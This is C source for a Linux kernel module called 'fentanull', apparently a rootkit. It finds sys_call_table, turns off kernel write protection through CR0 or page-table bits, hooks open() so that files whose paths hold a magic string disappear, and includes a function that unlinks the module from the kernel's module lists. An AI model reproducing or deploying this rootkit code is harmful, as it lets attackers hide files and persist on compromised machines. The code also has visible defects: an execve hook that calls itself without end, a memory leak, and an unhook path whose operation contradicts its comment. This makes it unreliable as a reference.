#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>  
#include <linux/unistd.h>   
#include <asm/paravirt.h>   
#include <asm/pgtable.h>     
#include <asm/uaccess.h> /* for copy_from_user */ 
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include "consts.h" 

MODULE_AUTHOR("cow");
MODULE_LICENSE("GPL");

asmlinkage int (*old_open)(const char *pathname, int flags, mode_t mode); 
asmlinkage int (*old_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*old_getdents64)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); 
asmlinkage int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);

static unsigned long *sys_call_table; 
pte_t *pte; 
static short mod_status = 0;
struct task_struct *kthread; 


inline void custom_write_cr0(unsigned long cr0)
{ 
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void cr0_enable(int mode)
{ 
	switch(mode)
	{
		case 1: 
		{
			unsigned long cr0 = read_cr0();
			custom_write_cr0(cr0 & (~0x00010000));
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); 
			#endif DEBUG	
			break;
		}
		case 0: 
		{	
			unsigned long cr0 = read_cr0();
			custom_write_cr0(cr0 | (0x00010000));
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); 
			#endif
			break;
		}
	}
	return;
} 

void mod_hide(void)
{ 
	/* removing fentanull from procfs and sysfs */ 
	list_del(&THIS_MODULE->list); 
	kobject_del(&THIS_MODULE->mkobj.kobj); 
	THIS_MODULE->sect_attrs = NULL; 
	THIS_MODULE->notes_attrs = NULL; 
	/* might add ->name stuff here */
}

asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *const envp[])
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: execve hooked\n");
	#endif 
	return fentanull_execve(filename, argv, envp);
} 

asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: open called\n"); 
	#endif
	char *kpathname; 
	kpathname = (char *)kmalloc(256, GFP_KERNEL);
	raw_copy_from_user(kpathname, pathname, 255);
	if (strstr(kpathname, MAGICSTR)!=NULL)
	{
		return -ENOENT;
	}
	else
	{
		/* kfree() the pathname */
		kfree(kpathname);
		return old_open(pathname, flags, mode);
	}
}

void set_open(int hook, int method)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: hooking open using cr0\n"); 
				#endif 
				/* WP off, write enabled */
				cr0_enable(1);
				/* swapping syscalls */ 
				old_open = (void *)sys_call_table[__NR_open]; 
				sys_call_table[__NR_open] = &fentanull_open;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: open hooked\n");
				#endif
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: hooking open using pte\n"); 
				#endif 
				/* bitwise OR, write enabled */
				pte->pte |= _PAGE_RW; 
				/* swapping syscalls */ 
				old_open = (void *)sys_call_table[__NR_open]; 
				sys_call_table[__NR_open] = &fentanull_open; 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open); 
				printk(KERN_ALERT "[-] rk: open hooked\n"); 
				#endif
				break;
			}
		}
	}
	else
	{
		/* unhook it */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: unhooking open using cr0\n"); 
				#endif 
				/* swapping syscalls */ 
				sys_call_table[__NR_open] = old_open;
				/* WP on, write disabled */	
				cr0_enable(0);
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: open unhooked\n");
				#endif
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: unhooking open using pte\n"); 
				#endif 
				/* swapping syscalls */ 
				sys_call_table[__NR_open] = old_open;
				/* bitwise AND, write disabled */ 
				pte->pte |= _PAGE_RW; 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: open unhooked\n");
				#endif
				break;
			}		
		}
	}
}

static int __init fentanull_init(void)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: Fentanull initialized.\n");
	#endif
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table"); 
	if (sys_call_table == NULL)
	{ 
		#ifdef DEBUG
		printk(KERN_ERR "[!] rk: sys_call_table == NULL.\n"); 
		#endif 
		return -1; 
	}
	else 
	{
		set_open(1, 1);
		return 0;	       
	}
}


static void __exit fentanull_exit(void)
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: Fentanull is exiting...\n"); 
	#endif 
	set_open(0, 1);
} 

module_init(fentanull_init);
module_exit(fentanull_exit);
